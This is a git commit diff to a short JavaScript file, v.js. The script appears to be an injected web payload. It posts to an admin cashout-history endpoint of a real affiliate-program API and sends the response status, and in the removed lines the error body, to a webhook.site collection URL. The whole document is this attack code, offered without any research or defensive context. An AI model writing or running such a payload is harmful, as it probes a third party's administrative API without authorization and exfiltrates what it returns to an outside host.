6ed253cd239772ad13ea25250cff7da8f83a47ca
tucha177 <iamyourluck777@gmail.com>
2025-10-07 22:02:41 +0300

    Update v.js

--- v.js
+++ v.js
@@ -1,7 +1,7 @@
 const dataToSend = {
 };
 
-fetch('https://affiliates-api.ggpartners.com/api2/upload_config', {
+fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/approved_and_declined_history/list', {
   method: 'POST', // Specify the HTTP method as POST
   headers: {
     'Content-Type': 'application/json' // Indicate the type of data being sent
@@ -10,6 +10,9 @@ fetch('https://affiliates-api.ggpartners.com/api2/upload_config', {
 })
 .then(response => {
   if (!response.ok) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+response.status, false ); // false for synchronous request
+    xmlHttp.send( null );
       throw new Error(`HTTP error! status: ${response.status}`);
     }
   a = response.json(); // Parse the JSON response from the server
@@ -25,8 +28,5 @@ fetch('https://affiliates-api.ggpartners.com/api2/upload_config', {
 .catch(error => {
   a = error.json(); // Parse the JSON response from the server
 
-  var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+a, false ); // false for synchronous request
-    xmlHttp.send( null );
-    return xmlHttp.responseText;
+  
 });
